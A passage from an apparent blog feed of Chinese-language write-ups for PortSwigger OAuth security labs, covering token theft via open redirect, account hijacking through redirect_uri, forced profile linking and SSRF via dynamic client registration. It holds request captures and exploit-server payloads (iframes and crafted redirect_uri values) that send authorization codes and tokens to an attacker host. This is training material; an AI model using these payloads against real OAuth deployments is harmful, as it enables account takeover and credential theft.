&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/GBJNdgQYfIKP3EGdZddwM&amp;#34;&amp;gt;/interaction/GBJNdgQYfIKP3EGdZddwM&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>回到主页，随机点选一篇文章的&lt;code>View post&lt;/code>，进入后点选最下方&lt;code>Next post&lt;/code>，对应Request&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /post/next?path=/post?postId=2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a7800fc0331631f823f21eb00500072.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>HTTP/2 302 Found
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>将&lt;code>Next post&lt;/code>的uri利用于目录遍历攻击处，点击最上方&lt;code>Go to exploit server&lt;/code>，并在Body构造&lt;code>'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;amp;response_type=token&amp;amp;nonce=321443983&amp;amp;scope=openid%20profile%20email'&lt;/code>
![Exploit bdoy]](/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-3.jpg)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击最下方的&lt;code>Store&lt;/code>、&lt;code>Deliver expolit to victim&lt;/code>后点击&lt;code>Access log&lt;/code>
&lt;img alt="Access log" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-4.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重放步骤2请求，并将&lt;code>Authorization: Bearer&lt;/code>参数更换为Admin的&lt;code>access_token&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Bearer GS-JMi8obX1Npl_w6ZM-gkPoCxtP7cpCtTJoK59wpIM&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;kPXuqKXUqK5HW58clRNewxWr1q80vNdO&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;administrator@normal-user.net&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>回到主页，点击最上方的&lt;code>Submit solution&lt;/code>，并输入&lt;code>apikey&lt;/code>内容即可解题&lt;/p>
&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: OAuth account hijacking via redirect_uri</title><link>/portswigger-posts/oauth-lab-oauth-account-hijacking-via-redirect-uri/</link><pubDate>Wed, 18 Dec 2024 22:06:13 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-account-hijacking-via-redirect-uri/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>点击右上方&lt;code>My account&lt;/code>时，出现以下跳转Request&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gxen32ezy00to1ap50mge&amp;amp;redirect_uri=https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0ab80053042f8581896b84f602af00b3.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback?code=qLYTUERIKmhJKEWvrGoX0YpedGklu7xwprAu1kDGrcm&amp;#34;&amp;gt;https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback?code=qLYTUERIKmhJKEWvrGoX0YpedGklu7xwprAu1kDGrcm&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /oauth-callback?code=W0PvtZoskGkaeRQIhUQpW6VA1KdILePu-AKvvNbGp9S &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0ad000120492857c89e286a900a20099.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>点击最上方&lt;code>Go to exploit server&lt;/code>并构造格式为&lt;code>&amp;lt;iframe src=&amp;quot;https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;amp;redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>的body，点击&lt;code>Store&lt;/code>、&lt;code>Deliver exploit to victim&lt;/code>
&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-2.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击&lt;code>Access log&lt;/code>
&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-3.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重放&lt;code>/oauth-callback?code=&lt;/code>，并将&lt;code>code&lt;/code>换成&lt;code>Access log&lt;/code>内所截获的任一&lt;code>/exploit?code=&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /oauth-callback?code=xdtSFD0NoksZKpY4ZsGwhK9HELhgQXLHd8juEW9OE5K &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0ad000120492857c89e286a900a20099.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>登录后为Admin
&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-4.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击右上角&lt;code>Admin panel&lt;/code>后点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/p>
&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Forced OAuth profile linking</title><link>/portswigger-posts/oauth-lab-oauth-forced-oauth-profile-linking/</link><pubDate>Tue, 17 Dec 2024 21:45:56 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-forced-oauth-profile-linking/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>Login with social media&lt;/code>登录&lt;code>peter.wiener:hotdog&lt;/code>
&lt;img alt="Login with social media" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-2.jpg">&lt;/li>
&lt;li>使用&lt;code>Login&lt;/code>登录&lt;code>wiener:peter&lt;/code>，并点击&lt;code>Attach a social profile&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=dhqow40h55y1b7wcijyyd&amp;amp;redirect_uri=https://0a1a00ed04a832b784b4afba004a0058.web-security-academy.net/oauth-linking&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a7f00d004bc32f78428ad89025a0063.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/0jV25qqAAnNBoeXmkFxdg&amp;#34;&amp;gt;/interaction/0jV25qqAAnNBoeXmkFxdg&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /interaction/0jV25qqAAnNBoeXmkFxdg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a7f00d004bc32f78428ad89025a0063.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>请注意上述请求不包含用于防范 CSRF 攻击的 state 参数&lt;/li>
&lt;li>开启Burp Proxy Intercept，并再次点击&lt;code>Attach a social profile&lt;/code>，在Burp Proxy Intercept中不断将Request Forward，直到下述Reqest出现，并将之Drop
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /oauth-linking?code=475weTD38sy3h-cNaA3iuZCJVu3WULDbyIiXULDbURe &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>关闭Burp Proxy Intercept，并回到主页后进行&lt;code>Log out&lt;/code>&lt;/li>
&lt;li>点击最上方的&lt;code>Go to exploit server&lt;/code>，Body中填入格式为&lt;code>&amp;lt;iframe src=&amp;quot;https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>的内容，填写完毕后点击&lt;code>Store&lt;/code>、&lt;code>Deliver exploit to victim&lt;/code>
&lt;img alt="Body" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-3.jpg">&lt;/li>
&lt;li>回到主页后通过&lt;code>Login with social media&lt;/code>登录，已提权为Admin
&lt;img alt="Role Admin" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-4.jpg">&lt;/li>
&lt;li>点击右上方&lt;code>Admin panel&lt;/code>后点击&lt;code>carlos - Delete&lt;/code> 即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF via OpenID dynamic client registration</title><link>/portswigger-posts/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration/</link><pubDate>Mon, 16 Dec 2024 22:09:47 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>在进行&lt;code>OAuth&lt;/code>认证过程中出现Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=l1kif2c33dzynw35u6gk4&amp;amp;redirect_uri=https://0a5f004403a359e4821360e0001b0098.web-security-academy.net/oauth-callback&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据&lt;code>OpenAPI doc&lt;/code>此站点包含&lt;code>/.well-known/openid-configuration&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /.well-known/openid-configuration &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;registration_endpoint&amp;#34;: &amp;#34;https://oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net/reg&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据上述返回注册接口在&lt;code>/reg&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;h1&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">oops! something went wrong&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/h1&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">error&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">: invalid_redirect_uri&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">error_description&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">: redirect_uris is mandatory property&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/div&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据错误提示，新增&lt;code>redirect_uris&lt;/code>参数后再次发送注册Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;redirect_uris&amp;#34;&lt;/span> : [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;https://example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;client_id&amp;#34;: &amp;#34;aMAjpQBJD2zyyZncdGkIj&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>&lt;code>client_id&lt;/code>为&lt;code>aMAjpQBJD2zyyZncdGkIj&lt;/code>，OAuth流程中，显示客户端应用程序的Logo的url为&lt;code>/client/client_id/logo&lt;/code>，对应此&lt;code>client id&lt;/code>为&lt;code>/client/aMAjpQBJD2zyyZncdGkIj/logo&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /client/aMAjpQBJD2zyyZncdGkIj/logo &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
